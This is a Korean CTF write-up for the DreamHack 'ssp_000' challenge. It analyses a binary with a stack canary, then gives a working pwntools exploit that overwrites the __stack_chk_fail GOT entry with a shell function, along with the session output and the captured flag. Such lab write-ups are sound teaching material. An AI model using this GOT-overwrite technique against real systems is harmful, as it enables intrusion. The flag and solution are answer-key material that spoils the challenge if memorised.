DreamHack_SPP_000


보호 기법

eunjung@eunjung-virtual-machine:~/dreamhack/ssp_000$ checksec ssp_000
[*] '/home/eunjung/dreamhack/ssp_000'
	Arch:	amd64-64-little
	RELRO:	Partial RELRO
	Stack:	Canary found
	NX:	NX enabled
	PIE:	No PIE (6x400000)

=> 
1) Arch
바이너리 파일의 아키텍처를 나타냅니다. 여기서 64bits binary를 알 수 있습니다.

2) RELRO (Relocation Read-Only)
바이너리 파일의 Relocation 영역에 대한 보호 수준을 나타냅니다. 여기서는 "Partial RELRO"로 나와있어, 일부 Relocation 영역이 읽기 전용(Read-Only)으로 설정되었음을 나타냅니다.

3) Stack 
바이너리 파일이 스택에 대한 보호 기능을 가지고 있는지 여부를 나타냅니다. "Canary found"로 나와있어, 스택에 Canary(카나리아)라고 불리는 값을 사용하여 버퍼 오버플로우와 같은 공격을 방어하는 것으로 추정됩니다.

4) NX (No eXecute)
바이너리 파일의 메모리 세그먼트에 대해 실행 권한이 있는지 여부를 나타냅니다. "NX enabled"로 나와있어, 메모리 세그먼트에 실행 권한이 없음을 나타냅니다. 이는 보안 상 중요한 기능 중 하나로, 악성 코드의 실행을 방지하는 역할을 합니다.

5) PIE (Position Independent Executable)
바이너리 파일이 메모리에 로드될 때 위치에 독립적인지 여부를 나타냅니다. "No PIE"로 나와있어, Position Independent Executable이 아니라는 것을 의미합니다. PIE가 비활성화되어 있으면 공격자가 메모리에서 함수의 정확한 위치를 예측하기가 더 쉽습니다.


소스코드 분석

  1 #include <stdio.h>
  2 #include <stdlib.h>
  3 #include <signal.h>
  4 #include <unistd.h>
  5 
  6 
  7 void alarm_handler() {
  8     puts("TIME OUT");
  9     exit(-1);
 10 }
 11 
 12 
 13 void initialize() {
 14     setvbuf(stdin, NULL, _IONBF, 0);
 15     setvbuf(stdout, NULL, _IONBF, 0);
 16 
 17     signal(SIGALRM, alarm_handler);
 18     alarm(30);
 19 }
 20 
 21 void get_shell() {
 22     system("/bin/sh");
 23 }
 24 
 25 int main(int argc, char *argv[]) {
 26     long addr;
 27     long value;
 28     char buf[0x40] = {};
 29 
 30     initialize();
 31 
 32 
 33     read(0, buf, 0x80);
 34 
 35     printf("Addr : ");
 36     scanf("%ld", &addr);
 37     printf("Value : ");
 38     scanf("%ld", &value);
 39 
 40     *(long *)addr = value;
 41 
 42     return 0;
 43 }

=> 
1) 3 ~ 5행
필요한 헤더파일을 포함합니다.

2) 7 ~10행
SIGALRM 시그널 핸들러 함수 alarm_handler를 정의합니다. 이 함수는 알람 시그널(SIGALRM)이 발생했을 때 호출되며, "TIME OUT" 메시지를 출력하고 프로그램을 종료합니다.

3) 12~19행
initialize 함수를 정의합니다. 이 함수는 프로그램의 초기화를 담당합니다. setvbuf 함수를 사용하여 표준 입력(stdin)과 표준 출력(stdout)의 버퍼링을 비활성화합니다. 그리고 signal 함수를 사용하여 SIGALRM 시그널을 처리할 핸들러를 등록하고, alarm 함수를 사용하여 30초 후에 SIGALRM 시그널을 발생시키도록 설정합니다.

4) 21~22행
get_shell 함수를 정의합니다. 이 함수는 /bin/sh 명령어를 실행하여 쉘을 얻는 역할을 합니다. 이 함수는 현재 코드에서 사용되지 않지만, 잠재적으로 프로그램의 취약점을 통해 호출될 수 있습니다.

5) 25~42행
main 함수를 정의합니다. 이 함수는 프로그램의 진입점입니다. 먼저, addr과 value라는 변수를 선언합니다. 그리고 크기가 0x40(16진수)인 buf라는 문자 배열을 선언합니다.
	· initialize 함수를 호출하여 프로그램을 초기화합니다.
	· 표준 입력으로부터 최대 0x80(16진수)바이트 만큼 읽어 buf에 저장합니다.
	· 사용자로부터 주소(addr)와 값을(value) 입력받습니다.
	· 입력받은 addr에 해당하는 메모리 주소에 value를 씁니다. 이 부분이 메모리 취약	점을 가진 부분으로, 입력된 주소에 사용자가 입력한 값을 덮어쓰는 동작을 합니다.








gdb에서 canary 확인하기

(gdb) disas main
Dump of assembler code for function main:
   0x00000000004008fb <+0>:	push   rbp
   0x00000000004008fc <+1>:	mov    rbp,rsp
   0x00000000004008ff <+4>:	sub    rsp,0x70
   0x0000000000400903 <+8>:	mov    DWORD PTR [rbp-0x64],edi
   0x0000000000400906 <+11>:	mov    QWORD PTR [rbp-0x70],rsi
   0x000000000040090a <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400913 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400917 <+28>:	xor    eax,eax
   0x0000000000400919 <+30>:	lea    rdx,[rbp-0x50]
   0x000000000040091d <+34>:	mov    eax,0x0
   0x0000000000400922 <+39>:	mov    ecx,0x8
   0x0000000000400927 <+44>:	mov    rdi,rdx
   0x000000000040092a <+47>:	rep stos QWORD PTR es:[rdi],rax
   0x000000000040092d <+50>:	mov    eax,0x0
   0x0000000000400932 <+55>:	call   0x40088e <initialize>
   0x0000000000400937 <+60>:	lea    rax,[rbp-0x50]
   0x000000000040093b <+64>:	mov    edx,0x80
   0x0000000000400940 <+69>:	mov    rsi,rax
   0x0000000000400943 <+72>:	mov    edi,0x0
   0x0000000000400948 <+77>:	call   0x400710 <read@plt>
   0x000000000040094d <+82>:	mov    edi,0x400a55
   0x0000000000400952 <+87>:	mov    eax,0x0
   0x0000000000400957 <+92>:	call   0x4006f0 <printf@plt>
   0x000000000040095c <+97>:	lea    rax,[rbp-0x60]
   0x0000000000400960 <+101>:	mov    rsi,rax
   0x0000000000400963 <+104>:	mov    edi,0x400a5d
   0x0000000000400968 <+109>:	mov    eax,0x0
   0x000000000040096d <+114>:	call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400972 <+119>:	mov    edi,0x400a61
   0x0000000000400977 <+124>:	mov    eax,0x0
   0x000000000040097c <+129>:	call   0x4006f0 <printf@plt>
---Type <return> to continue, or q <return> to quit---
   0x0000000000400981 <+134>:	lea    rax,[rbp-0x58]
   0x0000000000400985 <+138>:	mov    rsi,rax
   0x0000000000400988 <+141>:	mov    edi,0x400a5d
   0x000000000040098d <+146>:	mov    eax,0x0
   0x0000000000400992 <+151>:	call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400997 <+156>:	mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040099b <+160>:	mov    rdx,rax
   0x000000000040099e <+163>:	mov    rax,QWORD PTR [rbp-0x58]
   0x00000000004009a2 <+167>:	mov    QWORD PTR [rdx],rax
   0x00000000004009a5 <+170>:	mov    eax,0x0
   0x00000000004009aa <+175>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:	je     0x4009be <main+195>
   0x00000000004009b9 <+190>:	call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:	leave  
   0x00000000004009bf <+196>:	ret

(gdb) b *0x0000000000400948
Breakpoint 1 at 0x400948
(gdb) r
Starting program: /home/eunjung/dreamhack/ssp_000
Breakpoint 1, 0x0000000000400948 in main ()

(gdb) i r rsi
rsi            0x7fffffffde00	140737488346624
(gdb) x/40gx 0x7fffffffde00
0x7fffffffde00:	0x0000000000000000	0x0000000000000000
0x7fffffffde10:	0x0000000000000000	0x0000000000000000
0x7fffffffde20:	0x0000000000000000	0x0000000000000000
0x7fffffffde30:	0x0000000000000000	0x0000000000000000
0x7fffffffde40:	0x00007fffffffdf30	0x95e122e28cf06000 <<<<<---- canary
0x7fffffffde50:	0x00000000004009c0	0x00007ffff7a2d840
0x7fffffffde60:	0x0000000000000001	0x00007fffffffdf38
0x7fffffffde70:	0x00000001f7ffcca0	0x00000000004008fb
0x7fffffffde80:	0x0000000000000000	0xaa77d80aa93e6705
0x7fffffffde90:	0x0000000000400780	0x00007fffffffdf30
0x7fffffffdea0:	0x0000000000000000	0x0000000000000000
0x7fffffffdeb0:	0x55882775067e6705	0x558837cf154e6705
0x7fffffffdec0:	0x0000000000000000	0x0000000000000000
0x7fffffffded0:	0x0000000000000000	0x00007fffffffdf48
0x7fffffffdee0:	0x00007ffff7ffe168	0x00007ffff7de780b
0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
0x7fffffffdf00:	0x0000000000400780	0x00007fffffffdf30
0x7fffffffdf10:	0x0000000000000000	0x00000000004007a9
0x7fffffffdf20:	0x00007fffffffdf28	0x000000000000001c
0x7fffffffdf30:	0x0000000000000001	0x00007fffffffe2cf
익스플로잇 코드

from pwn import *

# “host1.dreamhack.games" 서버에 TCP 연결 생성
p = remote("host1.dreamhack.games", 8379)

# ELF 파일 분석
e = ELF("./ssp_000")

# 'get_shell' 함수의 주소 가져오기
get_shell = e.symbols['get_shell']

# '__stack_chk_fail' 함수의 GOT(Global Offset Table) 주소 가져오기
stack_chk_got = e.got['__stack_chk_fail']

# 0x50 바이트 크기의 'A'로 채워진 데이터 생성하여 서버로 전송
payload = b'A' * 0x50
p.sendline(payload)

# '__stack_chk_fail' 함수의 GOT 주소 출력
print("stack_chk_fail: ", hex(stack_chk_got))

# 서버로부터 "Addr : " 프롬프트를 기다린 후, '__stack_chk_fail' 함수의 GOT 주소 전송
p.sendlineafter("Addr : ", str(stack_chk_got))

# 서버로부터 "Value : " 프롬프트를 기다린 후, 'get_shell' 함수의 주소 전송
p.sendlineafter("Value : ", str(get_shell))

# 사용자와 상호작용 시작
p.interactive()







익스플로잇

eunjung@eunjung-virtual-machine : ~/dreamhack/ssp_000 : python3 remote.py 2> /dev/null

[+] Opening connection to host1.dreamhack.games on port 8379: Done
[*] '/home/eunjung/dreamhack/ssp_000'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] stack_chk_fail:  0x601020
[*] Switching to interactive mode

$ ls
flag
ssp_000

$ cat flag
DH{e4d253b82911565ad8dd9625fb491ab0}


Flag 값

DH{e4d253b82911565ad8dd9625fb491ab0}
